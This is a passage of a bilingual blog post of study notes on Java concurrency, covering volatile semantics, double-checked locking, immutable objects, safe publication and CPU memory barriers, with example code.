target=\"_blank\" rel=\"noopener\">来自于</a>)</p>\n<ul>\n<li><p>旧内存模型</p>\n<ul>\n<li>Under the old memory model, accesses to volatile variables could not be reordered with each other, but they could be reordered with nonvolatile variable accesses.</li>\n</ul>\n</li>\n<li><p>新内存模型（新内存模型是JSR133）</p>\n<ul>\n<li><p>Under the new memory model, it is still true that volatile variables cannot be reordered with each other. The difference is that it is now no longer so easy to reorder normal field accesses around them.</p>\n</li>\n<li><p>Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, <strong>anything that was visible to thread A when it writes to volatile field <code>f</code> becomes visible to thread B when it reads <code>f</code>.</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">VolatileExample</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">volatile</span> <span class=\"keyword\">boolean</span> v = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">writer</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    x = <span class=\"number\">42</span>;</span><br><span class=\"line\">    v = <span class=\"keyword\">true</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">reader</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v == <span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">      <span class=\"comment\">// uses x - guaranteed to see 42.</span></span><br><span class=\"line\">      <span class=\"comment\">// This would not have been true under the old memory model. </span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Effectively, the semantics of volatile have been strengthened substantially, almost to the level of synchronization. Each read or write of a volatile field acts like “half” a synchronization, for purposes of visibility.</p>\n</li>\n<li><p>Note that it is important for both threads to access the same volatile variable in order to properly set up the happens-before relationship. It is not the case that everything visible to thread A when it writes volatile field <code>f</code> becomes visible to thread B after it reads volatile field <code>g</code>. <strong>The release and acquire have to “match”</strong>(i.e., be performed on the same volatile field) to have the right semantics</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"文档\"><a href=\"#文档\" class=\"headerlink\" title=\"文档\"></a>文档</h3><p>－应该详细记载的内容</p>\n<ul>\n<li>同步策略（什么状态由什么锁保护、可见性如何维护）</li>\n<li>加锁顺序</li>\n<li>没有加锁情况下的同步策略（比如使用一个flag阻止其他线程在flag为true之前使用某资源）</li>\n<li>资源池的配置（避免资源依赖死锁）</li>\n<li>如果不能通过open call来避免死锁，那么应该详细记载如何避免在调用时出现死锁<ul>\n<li>应该将条件队列相关联的条件谓词以及在这些谓词上等待的操作都写入文档</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"对象的初始化\"><a href=\"#对象的初始化\" class=\"headerlink\" title=\"对象的初始化\"></a>对象的初始化</h3><ul>\n<li>即使某个对象的引用对于其他线程是可见的，也并不意味着对象状态对于使用该对象的线程一定是可见的</li>\n<li>为了确保对象状态能够呈现出一致的视图，必须使用同步</li>\n</ul>\n<h3 id=\"this逸出\"><a href=\"#this逸出\" class=\"headerlink\" title=\"this逸出\"></a><code>this</code>逸出</h3><ul>\n<li>只有当对象的构造函数返回时，对象才处于可预测的和一致的状态。因此，从构造函数发布对象时，发布了一个尚未构造完成的对象。</li>\n<li>例子：<ul>\n<li>在构造函数启动线程</li>\n<li>在构造函数调用一个可以override的方法（非private、非final的方法，可以被子类override）</li>\n</ul>\n</li>\n<li>可以通过使用<code>start</code>函数来启动线程、使用工厂方法和私有构造函数（即不要再构造函数启动，而是在工厂方法中，构造函数返回后才启动）</li>\n</ul>\n<h3 id=\"Final域\"><a href=\"#Final域\" class=\"headerlink\" title=\"Final域\"></a>Final域</h3><ul>\n<li><p>还有一种情况可以安全地访问一个共享域， 即这个域声明为 final 时</p>\n</li>\n<li><p>在java内存模型中，final域能确保初始化过程的安全性，从而可以不受限制的访问不可变对象，并在共享这些对象时无需同步。为了维持这种初始化安全性的保证，需要满足不可变性的所有需求</p>\n<ul>\n<li>状态不可修改</li>\n<li>所有域都是final类型</li>\n<li>正确的构造</li>\n</ul>\n<p>这种保证还延伸到正确创建的对象中所有final类型的域，在没有额外同步的情况下，也可以安全的访问final类型的域。不过，如果这些final域指向的是可变对象，那么访问这些域所指向的对象的状态时还是需要同步</p>\n</li>\n<li><p>在发布不可变对象时，没有使用同步，也可以安全地访问该对象</p>\n</li>\n</ul>\n<h3 id=\"原子变量\"><a href=\"#原子变量\" class=\"headerlink\" title=\"原子变量\"></a>原子变量</h3><ul>\n<li>如果有大量线程要访问相同的原子值， 性能会大幅下降， 因为乐观更新需要太多次重试。</li>\n<li>Java SE 8 提供了 LongAdder 和 LongAccumulator 类来解决这个问题。LongAdder 包括多个变量（加数)， 其总和为当前值。可以有多个线程更新不同的加数，线程个数增加时会自动提供新的加数。通常情况下， 只有当所有工作都完成之后才需要总和的值， 对于这种情况，这种方法会很高效。性能会有显著的提升。</li>\n</ul>\n<h3 id=\"Double-Checked-Locking-DCL\"><a href=\"#Double-Checked-Locking-DCL\" class=\"headerlink\" title=\"Double Checked Locking(DCL)\"></a>Double Checked Locking(DCL)</h3><ul>\n<li><p><a href=\"https://www.cs.umd.edu/~pugh/java/memoryModel/jsr-133-faq.html\" target=\"_blank\" rel=\"noopener\">来自于</a></p>\n</li>\n<li><p>示例代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// double-checked-locking - don't do this!</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Something instance = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> Something <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (instance == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">synchronized</span> (<span class=\"keyword\">this</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (instance == <span class=\"keyword\">null</span>)</span><br><span class=\"line\">        instance = <span class=\"keyword\">new</span> Something();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> instance;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>There’s only one problem with it – <strong>it doesn’t work</strong>. Why not? The most obvious reason is that the writes which initialize <code>instance</code> and the write to the <code>instance</code> field can be reordered by the compiler or the cache, which would have the effect of <strong>returning what appears to be a partially constructed <code>Something</code></strong>. The result would be that we read an uninitialized object. </p>\n</li>\n<li><p>There is no way to fix it using the <strong>old Java memory model.</strong></p>\n</li>\n<li><p>Under the new memory model, making the <code>instance</code> field volatile will “fix” the problems with double-checked locking, because then there will be a happens-before relationship between the initialization of the <code>Something</code> by the constructing thread and the return of its value by the thread that reads it.（我猜，这个happen-before是不是就是<code>程序顺序规则</code>（each action in a thread haappens-before every action in that thread that come later in the program order）和<code>传递性</code>和<code>volatile 变量规则</code>的结合——就是<code>instance=new Something()</code>在单线程中必须保证构造操作在赋值给instance操作之前，然后volatile又保证了写入在读取之前，所以一旦另一个线程读取了instance，则根据传递性，构造操作已经完成了）</p>\n</li>\n<li><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Something</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">Something</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LazyHolder</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Something INSTANCE = <span class=\"keyword\">new</span> Something();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Something <span class=\"title\">getInstance</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> LazyHolder.INSTANCE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>This code is guaranteed to be correct because of <strong>the initialization guarantees for static fields; if a field is set in a static initializer, it is guaranteed to be made visible, correctly, to any thread that accesses that class</strong>.</p>\n</li>\n</ul>\n<h3 id=\"锁\"><a href=\"#锁\" class=\"headerlink\" title=\"锁\"></a>锁</h3><ul>\n<li>作用<ul>\n<li>互斥</li>\n<li>原子性（复合操作的执行过程中持有一个锁，则这组操作成为原子操作）</li>\n<li>内存可见性（所有线程都能看到共享变量的最新值——只需要所有线程都在同一个锁上同步）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"synchronized\"><a href=\"#synchronized\" class=\"headerlink\" title=\"synchronized\"></a>synchronized</h3><ul>\n<li>用于实现原子性</li>\n<li>可重入</li>\n<li>确定临界区</li>\n<li>Constructors in Java can not use the synchronized keyword，但是可以<code>synchronized(this){}</code></li>\n<li>内存可见性——某个线程修改了对象状态后，其他线程可以看到发生的状态的变化</li>\n<li>每个对象都有一个内部锁，该锁有一个内部条件（条件对应Object对象的final方法<code>wait</code>、<code>notify</code>、<code>notifyAll</code>方法）（所以一旦某个对象的一个<code>synchronized</code>方法被调用后，该对象的另一个<code>synchronized</code>方法会被阻塞）</li>\n<li>调用synchronized静态方法获得相关的类对象（Class对象）的内部锁。要注意，使用不同的classLoader加载出来的Class对象是不同的</li>\n<li>监视器<ul>\n<li>用Java的术语来讲，监视器具有如下特性：<ul>\n<li>监视器是只包含私有域的类。</li>\n<li>每个监视器类的对象有一个相关的锁。</li>\n<li>使用该锁对所有的方法进行加锁。换句话说，如果客户端调用obj.meth0d(),那么obj对象的锁是在方法调用开始时自动获得（这是获得锁的唯一途径），并且当方法返回时自动释放该锁（无论是正常退出还是异常退出）。因为所有的域是私有的，这样的安排可以确保一个线程在对对象操作时，没有其他线程能访问该域</li>\n<li>该锁可以有任意多个相关条件</li>\n</ul>\n</li>\n<li>Java设计者以不是很精确的方式采用了监视器概念，Java中的每一个对象有一个内部的锁和内部的条件。如果一个方法用synchronized关键字声明，那么，它表现的就像是一个监视器方法。通过调用wait/notifyAll/notify来访问条件变量。然而，在下述的3个方面Java对象不同于监视器，从而使得线程的安全性下降：<ul>\n<li>域不要求必须是private。</li>\n<li>方法不要求必须是synchronized。</li>\n<li>内部锁对客户是可用的。</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>局限<ul>\n<li>不能中断一个正在试图获得锁的线程</li>\n<li>没有超时</li>\n<li>只有单一的条件</li>\n<li>不提供公平的锁</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"内存可见性\"><a href=\"#内存可见性\" class=\"headerlink\" title=\"内存可见性\"></a>内存可见性</h3><ul>\n<li>最低安全性<ul>\n<li>某个线程没有同步情况下读取变量，可能会得到一个失效值，但这个值至少是之前某个线程设置的，而不是随机的</li>\n<li>Java内存模型要求，变量的读取和写入必须是原子操作，但是非<code>volatile</code>的<code>long</code>，<code>double</code>例外</li>\n<li>JVM允许将64bit的读或写操作分解为两个32bit的操作，因此可能无法满足最低安全性（除非用<code>volatile</code>声明或是用锁保护）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"不可变对象\"><a href=\"#不可变对象\" class=\"headerlink\" title=\"不可变对象\"></a>不可变对象</h3><h4 id=\"需要满足的条件\"><a href=\"#需要满足的条件\" class=\"headerlink\" title=\"需要满足的条件\"></a>需要满足的条件</h4><ul>\n<li>对象创建后其状态不能修改</li>\n<li>对象的所有域是final类型的（可以不用，比如<code>String</code>的<code>hashCode</code>这个field）</li>\n<li>对象是正确创建的（创建期间，this没有逸出）</li>\n</ul>\n<h4 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h4><ul>\n<li><p>对象内部可以使用可变对象来管理状态</p>\n</li>\n<li><p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">final</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ThreeStooges</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Set&lt;String&gt; stooges = <span class=\"keyword\">new</span> HashSet&lt;String&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">ThreeStooges</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        stooges.add(<span class=\"string\">\"Moe\"</span>);</span><br><span class=\"line\">        stooges.add(<span class=\"string\">\"Larry\"</span>);</span><br><span class=\"line\">        stooges.add(<span class=\"string\">\"Curly\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">boolean</span> <span class=\"title\">isStooge</span><span class=\"params\">(String name)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> stooges.contains(name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用<code>volatile</code>+不可变对象来实现一组状态的原子操作</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">OneValueCache</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> BigInteger lastNumber;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> BigInteger[] lastFactors;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">OneValueCache</span><span class=\"params\">(BigInteger i,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                         BigInteger[] factors)</span> </span>&#123;</span><br><span class=\"line\">        lastNumber = i;</span><br><span class=\"line\">        <span class=\"comment\">// 如果没有这个copyOf，就不是不可变的</span></span><br><span class=\"line\">        lastFactors = Arrays.copyOf(factors, factors.length);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> BigInteger[] getFactors(BigInteger i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (lastNumber == <span class=\"keyword\">null</span> || !lastNumber.equals(i))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> Arrays.copyOf(lastFactors, lastFactors.length);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">VolatileCachedFactorizer</span> <span class=\"keyword\">implements</span> <span class=\"title\">Servlet</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> OneValueCache cache =</span><br><span class=\"line\">            <span class=\"keyword\">new</span> OneValueCache(<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">service</span><span class=\"params\">(ServletRequest req, ServletResponse resp)</span> </span>&#123;</span><br><span class=\"line\">        BigInteger i = extractFromRequest(req);</span><br><span class=\"line\">        <span class=\"comment\">// 如果这里多个请求到来，某个请求调用getFactors调用到一半</span></span><br><span class=\"line\">        <span class=\"comment\">// 然后另一个请求则把cache赋值成另外一个对象，那么有没有问题？</span></span><br><span class=\"line\">        <span class=\"comment\">// 似乎c++就不可以这样做，因为这个需要自动垃圾收集</span></span><br><span class=\"line\">        BigInteger[] factors = cache.getFactors(i);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (factors == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            factors = factor(i);</span><br><span class=\"line\">            cache = <span class=\"keyword\">new</span> OneValueCache(i, factors);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        encodeIntoResponse(resp, factors);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"正确的发布\"><a href=\"#正确的发布\" class=\"headerlink\" title=\"正确的发布\"></a>正确的发布</h3><ul>\n<li><p>发布（publish）：使对象能够在当前作用域之外的代码中使用</p>\n</li>\n<li><p>逸出（escape）：某个不该发布的对象被发布</p>\n</li>\n<li><p>不可变对象<strong>可以通过任意的机制发布</strong></p>\n<ul>\n<li><p>3.4节，不可变对象那里，代码3-13使用了<code>volatile</code>来保证其他线程看到最新的引用。另外，3.5.2节说，即使发布不可变对象时，没有使用同步，仍然可以安全的访问该对象（上面那一段说，“即使某个对象的引用对于其他线程可见，也不意味着对象的状态对于使用该对象的线程一定是可见的”）。这里的“不需要同步”的含义是指，不需要同步即可以保证对象状态的可见性，而不是说，每次更新引用，都会让其他线程看到新的引用值。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SynTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">static</span> FC fc = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException </span>&#123;</span><br><span class=\"line\">        Thread t1 = <span class=\"keyword\">new</span> Thread(() -&gt; &#123;</span><br><span class=\"line\">            fc = <span class=\"keyword\">new</span> FC();</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        Thread t2 = <span class=\"keyword\">new</span> Thread(() -&gt; &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (fc == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">int</span> n = fc.n * <span class=\"number\">10</span>;</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> n * <span class=\"number\">10</span> == <span class=\"number\">50</span> * <span class=\"number\">20</span>;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        t2.start();</span><br><span class=\"line\">        Thread.sleep(<span class=\"number\">100</span>);</span><br><span class=\"line\">        t1.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FC</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> n = <span class=\"number\">10</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>第二个线程没有退出。所以，其实不可变对象的发布时不需要同步的含义应该是“另一个线程可以看到完整的对象状态”。（很奇怪，如果把两个<code>start</code>的位置颠倒，或者是去掉<code>sleep</code>，则会导致成功结束)</p>\n</li>\n<li>Java内存模型为不可变对象的共享提供了一种特殊的初始化安全性保证</li>\n<li>即使在发布不可变对象的引用时没有使用同步，也可以安全的访问该对象。为了实现这种安全，对象必须满足上面提到的不可变对象的所有要求</li>\n<li>这种保证还包括被<strong>正确创建对象</strong>中的所有final类型的域。但是如果这些域是可变对象，那么在访问时还是需要同步</li>\n</ul>\n</li>\n<li>事实不可变对象（比如某个<code>Date</code>对象被构造后，就只执行读操作，类似于java要求lambda可以读取的lambda外变量是“事实不可变的”）<strong>必须通过安全的方式发布</strong></li>\n<li>可变对象<strong>必须通过安全的方式发布</strong>，并且必须是线程安全的或者某个锁保护起来</li>\n</ul>\n<h4 id=\"可变对象的正确的发布\"><a href=\"#可变对象的正确的发布\" class=\"headerlink\" title=\"可变对象的正确的发布\"></a>可变对象的正确的发布</h4><ul>\n<li><p>即使某个对象的引用对于其他线程是可见的，也不意味着对象状态对于使用该对象的线程是一定可见的。为了确保对象状态呈现出一致性视图（对象的引用与对象的状态必须同时对其他线程可见），必须要使用<strong>同步</strong>（包括发布时和使用时）</p>\n</li>\n<li><p>常用的发布模式</p>\n<ul>\n<li><p>在静态初始化函数中初始化一个对象引用（不知道“静态初始化函数”是否等价于“静态初始化器”）（因为静态初始化器由JVM在类的初始化阶段执行，JVM内部存在同步机制）</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Holder holder = <span class=\"keyword\">new</span> Holder(<span class=\"number\">42</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>虚拟机会保证一个类的<code>&lt;clinit&gt;()</code>方法在多线程环境中被正确地加锁、同步,如果多个线程同时去初始化一个类,那么只会有一个线程去执行这个类的<code>&lt;clinit&gt;()</code>方法,其他线程都需要阻塞等待,直到活动线程执行<code>&lt;clinit&gt;()</code>方法完毕</p>\n<p><code>&lt;clinit&gt;()</code>方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块(<code>static{}</code>块)中的语句合并产生的</p>\n<p>来自深入理解JVM</p>\n</blockquote>\n</li>\n<li><p>将对象的引用保存在volatile类型的域或者AtomicReference对象中</p>\n</li>\n<li><p>将对象的引用保存在某个正确构造对象的final类型域中</p>\n</li>\n<li><p>将对象的引用保存在一个由锁保护的域中</p>\n<ul>\n<li>线程安全容器（比如<code>Hashtable</code>、<code>synchronizedMap</code>、<code>ConcurrentMap</code>、<code>Vector</code>、<code>CopyOnWriteArrayList</code>、<code>CopyOnWriteArraySet</code>、<code>synchronizedList</code>、<code>synchronizedSet</code>、<code>BlockingQueue</code>、<code>ConcurrentLinkedQueue</code>）内部的同步意味着将对象放入到某个容器中，将满足这一条要求）</li>\n<li><code>Future</code>、<code>Exchanger</code>也可以</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"lambda使用外部的对象（或value-type的变量）\"><a href=\"#lambda使用外部的对象（或value-type的变量）\" class=\"headerlink\" title=\"lambda使用外部的对象（或value type的变量）\"></a>lambda使用外部的对象（或value type的变量）</h3><blockquote>\n<p>以下均为我个人根据final域的特性认为的——不知道final域与final变量的差别是什么</p>\n</blockquote>\n<ul>\n<li>lambda可以使用外部的final或事实final的变量</li>\n<li>如果是这个final对象引用的变量，没有问题，可见（就是引用对于其他线程可见时，其内部的状态也是，可以保证一致性）</li>\n<li>如果引用的是可变对象，则要同步</li>\n</ul>\n<h3 id=\"内部类与final变量\"><a href=\"#内部类与final变量\" class=\"headerlink\" title=\"内部类与final变量\"></a>内部类与final变量</h3><ul>\n<li>TODO：内部类引用外部的变量时，不要求其为final的，那么怎么办，可见性如何保证</li>\n</ul>\n<h3 id=\"volatile-vs-锁\"><a href=\"#volatile-vs-锁\" class=\"headerlink\" title=\"volatile vs 锁\"></a>volatile vs 锁</h3><ul>\n<li>锁可以确保可见性和原子性</li>\n<li>volatile只确保可见性</li>\n</ul>\n<h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><ul>\n<li>开发服务器应用时，要始终加上<code>-server</code>参数，client模式的JVM优化与server的不一样</li>\n</ul>\n<h3 id=\"内存屏障\"><a href=\"#内存屏障\" class=\"headerlink\" title=\"内存屏障\"></a>内存屏障</h3><ul>\n<li>MFENCE, LFENCE, SFENCE (Ref from intel manual 325462-sdm-vol-1-2abcd-3abcd)<blockquote>\n<ul>\n<li>MFENCE: Performs a serializing operation on all load-from-memory and store-to-memory instructions that were issued prior the MFENCE instruction. <strong>This serializing operation guarantees that every load and store instruction that precedes the MFENCE instruction in program order becomes globally visible before any load or store instruction that follows the MFENCE instruction.</strong> The MFENCE instruction is ordered with respect to all load and store instructions, other MFENCE instructions, any LFENCE and SFENCE instructions, and any serializing instructions (such as the CPUID instruction). MFENCE does not serialize the instruction stream.</li>\n<li>SFENCE: Orders processor execution relative to all memory stores prior to the SFENCE instruction. <strong>The processor ensures that every store prior to SFENCE is globally visible before any store after SFENCE becomes globally visible.</strong> The SFENCE instruction is ordered with respect to memory stores, other SFENCE instructions, MFENCE instructions, and any serializing instructions (such as the CPUID instruction). It is not ordered with respect to memory loads or the LFENCE instruction.</li>\n<li>LFENCE: <strong>Performs a serializing operation on all load-from-memory instructions that were issued prior the LFENCE instruction. Specifically, LFENCE does not execute until all prior instructions have completed locally, and no later instruction begins execution until LFENCE completes</strong>. In particular, an instruction that loads from memory and that precedes an LFENCE receives data from memory prior to completion of the LFENCE. (An LFENCE that follows an instruction that stores to memory might complete before the data being stored have become globally visible.) Instructions following an LFENCE may be fetched from memory before the LFENCE, but they will not execute until the LFENCE completes.</li>\n</ul>\n</blockquote>\n</li>\n<li>read barrier, write barrier, (<a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/Documentation/memory-barriers.txt?id=HEAD\" target=\"_blank\" rel=\"noopener\">Ref</a>)<blockquote>\n<ul>\n<li>Read barrier: <strong>A read barrier is a data dependency barrier plus a guarantee that all the LOAD operations specified before the barrier will appear to happen before all the LOAD operations specified after the barrier with respect to the other components of the system.</strong> A read barrier is a partial ordering on loads only; <strong>it is not required to have any effect on stores</strong>. Read memory barriers imply data dependency barriers, and so can substitute for them. [!] Note that read barriers should normally be paired with write barriers; see the “SMP barrier pairing” 